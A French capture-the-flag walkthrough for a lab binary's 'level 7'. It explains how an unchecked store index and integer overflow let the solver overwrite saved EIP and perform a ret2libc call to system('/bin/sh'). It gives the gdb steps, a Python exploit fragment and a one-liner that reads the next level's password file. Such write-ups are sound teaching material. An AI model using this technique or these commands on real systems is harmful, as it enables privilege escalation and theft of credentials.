# level 7 #

Pour cet exo, les sécurités suivantes sont activées :Partial RELRO et stack canary, mais  NX désactivé donc on peut exécuter la stack.

L'executable sert à stocker des nombres: la commande `store` écrit un entier à `tab + 4 * index`. 
 

```asm
mov     eax, DWORD PTR [ebp-0xc]        ; index 
shl     eax, 0x2                        ; index multplié par 4 car bitshifté de 2 vers la gauche
add     eax, DWORD PTR [ebp+0x8]        ; tab + 4*index
mov     edx, DWORD PTR [ebp-0x10]       ; number
mov     DWORD PTR [eax], edx            ; stockage de number
```

```c
number = get_unum();
index  = get_unum();
if (index % 3 == 0 || number >> 0x18 == 0xb7) {  
    puts(" *** ERROR! *** ... reserved for wil!");
    return 1;
}
*(int *)(a1 + 4 * index) = number;  
```
La valeur d'`index` est controlée : elle ne doit pas être un multiple de 3.
Mais comme la valeur d'`index` est pas limitée, on va détourner la fonction `store` pour stocker un nombre à l'emplacement du saved eip du main. Et ça tombe bien puisqu'on stocke pile un DWORD, donc de quoi mettre une adresse mémoire, bien après la limite de `tab`.

L'index du saved EIP repéré sous gdb est 114... Sauf que c'est un multiple de 3 ! 
Mais le check a lieu avant que le bitshifting ait lieu : on prend donc la valeur qu'on veut (114), on ajoute ajoute un bit tout au début de l'octet pour modifier sa valeur (et qui lui donne donc une très grosse valeur), et quand le bitshifting intervient, les bits sont tous poussés vers la gauche deux fois.

Le bit qu'on a ajouté overflow donc, et l'index est multiplié par 4 (pour tenir compte de la taille des ints, `tab` étant un tableau d'ints).

On peut donc passer la vérification du modulo 3, et on peut stocker le nombre à l'emplacement mémoire `tab + 456`, pour écrire par dessus le saved EIP. 

On écrit donc bien au saved EIP tout en trompant la vérification.

Cette fois on doit faire un ret2Libc parce que le programme memset tout l'env à 0 au début, donc pas possible de mettre du shellcode dedans. 
On veut que la stack ressemble à ça :

```
index 114  -> saved EIP            adresse de system()
index 115  -> adresse de retour     (peu importe)
index 116  -> argument de system() adresse de "/bin/sh"
```

Les deux adresses se récupèrent sous gdb :

```
(gdb) b main
(gdb) run
(gdb) info functions system
0xf7e6aed0  system
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Et du coup, juste deux écritures suffisent (puisqu'on se moque de ce qui se trouve entre les deux) :

```python
store(0xf7e6aed0, converted_index(114))  # 4159090384 = &system
store(0xf7f897ec, converted_index(116))  # 4160264172 = &"/bin/sh"
```

Du coup ça donne : 

```bash
(python /tmp/exploit.py; echo cat /home/users/level08/.pass) | ./level07
```

Au `ret` de `main`, `system("/bin/sh")` est appelé BOOM : on a un shell. On a évité le canary puisqu'on a pas rempli la stack avec du padding, on a écrit à deux emplacements bien précis. 

